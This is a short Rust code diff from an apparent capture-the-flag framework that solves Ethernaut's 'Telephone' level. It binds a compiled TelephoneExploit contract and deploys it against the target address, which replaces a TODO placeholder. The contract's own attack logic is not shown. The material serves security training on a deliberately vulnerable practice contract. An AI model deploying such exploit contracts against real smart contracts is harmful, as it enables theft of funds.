@@ -10,6 +10,13 @@ use ctf::ethereum::ethernaut::lvl04_telephone::*;
 
 pub struct Exploit;
 
+alloy::sol!(
+    #[allow(missing_docs)]
+    #[sol(rpc)]
+    TelephoneExploit,
+    "out/TelephoneExploit.sol/TelephoneExploit.json"
+);
+
 #[async_trait]
 impl ctf::Exploit for Exploit {
     type Target = Target;
@@ -19,8 +26,9 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        let _ = TelephoneExploit::deploy(offender.provider(), target.address)
+            .await?;
+
         Ok(())
     }
 }
